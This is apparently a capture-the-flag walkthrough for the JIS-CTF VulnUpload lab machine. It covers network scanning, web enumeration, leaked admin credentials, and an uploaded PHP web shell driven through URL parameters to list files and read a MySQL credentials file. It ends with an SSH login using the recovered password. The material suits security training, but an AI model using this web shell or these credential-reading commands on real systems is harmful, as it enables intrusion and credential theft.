#### JIS-CTF: VulnUpload

- [Attacker Info]()
- [Identify Victim]()
- [Nmap Scan]()
- [Web Enumeration]()
- [Enumerating SSH]()

###### Attacker Info

```sh
root@kali:~# ifconfig 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.28  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fea3:a109  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:a3:a1:09  txqueuelen 1000  (Ethernet)
        RX packets 244548  bytes 353572414 (337.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 287382  bytes 17699923 (16.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# 
```

###### Identify Victim

```sh
root@kali:~# netdiscover 

 Currently scanning: 192.168.23.0/16   |   Screen View: Unique Hosts                                                                                         
                                                                                                                                                             
 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300                                                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.7     f4:0f:24:33:5e:d1      1      60  Apple, Inc.                                                                                               
 192.168.1.1     a0:63:91:f0:cc:4b      1      60  NETGEAR                                                                                                   
 192.168.1.32    f4:0f:24:33:5e:d1      1      60  Apple, Inc.                                                                                               
 192.168.1.32    08:00:27:68:18:58      1      60  PCS Systemtechnik GmbH                                                                                    
 192.168.1.8     d0:2b:20:dc:d7:f0      1      60  Apple, Inc.                                                                                               

root@kali:~# 
```

###### Nmap Scan

```sh
root@kali:~/jis# nmap -sV -sC -oA jis.nmap 192.168.1.32
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-13 16:22 EDT
Nmap scan report for 192.168.1.32
Host is up (0.00027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec (RSA)
|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac (ECDSA)
|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 8 disallowed entries 
| / /backup /admin /admin_area /r00t /uploads 
|_/uploaded_files /flag
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Sign-Up/Login Form
|_Requested resource was login.php
MAC Address: 08:00:27:68:18:58 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
root@kali:~/jis# 
```

###### Web Enumeration

```
http://192.168.1.32/login.php
```

![](images/1.png)

```
http://192.168.1.32/robots.txt
```

![](images/2.png)

- Flag 1 &rarr; `8734509128730458630012095`

![](images/3.png)

- Flag 2 &rarr; `7412574125871236547895214`

```
http://192.168.1.32/admin_area/
```

![](images/4.png)

![](images/5.png)

![](images/6.png)

```
<!--	username : admin
		password : 3v1l_H@ck3r
		The 2nd flag is : {7412574125871236547895214}
-->
```

![](images/7.png)

![](images/8.png)

`shell.php`

```php
<?php echo system($_REQUEST['cmd']); ?>
```

![](images/9.png)

![](images/10.png)

![](images/11.png)

![](images/12.png)

```
http://192.168.1.32/uploaded_files/shell.php?cmd=id
http://192.168.1.32/uploaded_files/shell.php?cmd=pwd
http://192.168.1.32/uploaded_files/shell.php?cmd=ls
```

![](images/13.png)

![](images/14.png)

![](images/15.png)

```
http://192.168.1.32/uploaded_files/shell.php?cmd=ls+-la+/var/www/html
```

![](images/16.png)

```
http://192.168.1.32/uploaded_files/shell.php?cmd=cat+/var/www/html/hint.txt
```

![](images/17.png)

- Flag 3 &rarr; `7645110034526579012345670`

```
http://192.168.1.32/uploaded_files/shell.php?cmd=ls+-la+/etc/mysql
```

![](images/18.png)

```
http://192.168.1.32/uploaded_files/shell.php?cmd=ls+-la+/etc/mysql/conf.d
```

![](images/19.png)

```
http://192.168.1.32/uploaded_files/shell.php?cmd=cat+/etc/mysql/conf.d/credentials.txt
```

![](images/20.png)

- Flag 4 &rarr; `7845658974123568974185412`

```
username : technawi
password : 3vilH@ksor
```

###### Enumerating SSH

```sh

root@kali:~/jis# ssh technawi@192.168.1.32
The authenticity of host '192.168.1.32 (192.168.1.32)' can't be established.
ECDSA key fingerprint is SHA256:ThPvIGqyDX2PSqt5JWHyy/J/Hy2hK5aVcpKTpkTKHQE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.32' (ECDSA) to the list of known hosts.
technawi@192.168.1.32's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-72-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Fri Apr 21 17:22:16 2017
technawi@Jordaninfosec-CTF01:~$ ls -lah
total 48K
drwxr-xr-x 3 technawi technawi 4.0K Apr 21  2017 .
drwxr-xr-x 3 root     root     4.0K Apr 11  2017 ..
-rw-r--r-- 1 root     root     7.0K Apr 18  2017 1
-rw------- 1 technawi technawi 4.3K Apr 21  2017 .bash_history
-rw-r--r-- 1 technawi technawi  220 Apr 11  2017 .bash_logout
-rw-r--r-- 1 technawi technawi 3.7K Apr 11  2017 .bashrc
drwx------ 2 technawi technawi 4.0K Apr 11  2017 .cache
-rw-r--r-- 1 technawi technawi  655 Apr 11  2017 .profile
-rw-r--r-- 1 technawi technawi    0 Apr 11  2017 .sudo_as_admin_successful
-rw------- 1 root     root     6.6K Apr 21  2017 .viminfo
technawi@Jordaninfosec-CTF01:~$ 
```

```sh
technawi@Jordaninfosec-CTF01:~$ cd /var/www/html/
technawi@Jordaninfosec-CTF01:/var/www/html$ ls -lah
total 60K
drwxr-xr-x 8 www-data www-data 4.0K Apr 21  2017 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 18  2017 ..
drwxrwxr-x 2 www-data www-data 4.0K Apr 21  2017 admin_area
drwx------ 5 www-data www-data 4.0K Apr 19  2017 assets
-rw-r--r-- 1 www-data www-data  306 Apr 19  2017 check_login.php
drwx------ 2 www-data www-data 4.0K Apr 19  2017 css
drwxr-xr-x 2 www-data www-data 4.0K Apr 21  2017 flag
-rw-r----- 1 technawi technawi  132 Apr 21  2017 flag.txt
-rw-r--r-- 1 www-data www-data  145 Apr 21  2017 hint.txt
-rw-rw-r-- 1 www-data www-data 2.0K Apr 19  2017 index.php
drwx------ 2 www-data www-data 4.0K Apr 19  2017 js
-rw-rw-r-- 1 www-data www-data 1.5K Apr 19  2017 login.php
-rw-r--r-- 1 www-data www-data  128 Apr 19  2017 logout.php
-rw-rw-r-- 1 www-data www-data  160 Apr 19  2017 robots.txt
drwxrwxr-x 2 www-data www-data 4.0K May 14 00:25 uploaded_files
technawi@Jordaninfosec-CTF01:/var/www/html$ cat flag.txt 
The 5th flag is : {5473215946785213456975249}

Good job :)

You find 5 flags and got their points and finish the first scenario....
technawi@Jordaninfosec-CTF01:/var/www/html$ 
```

- Flag 5 &rarr; `5473215946785213456975249`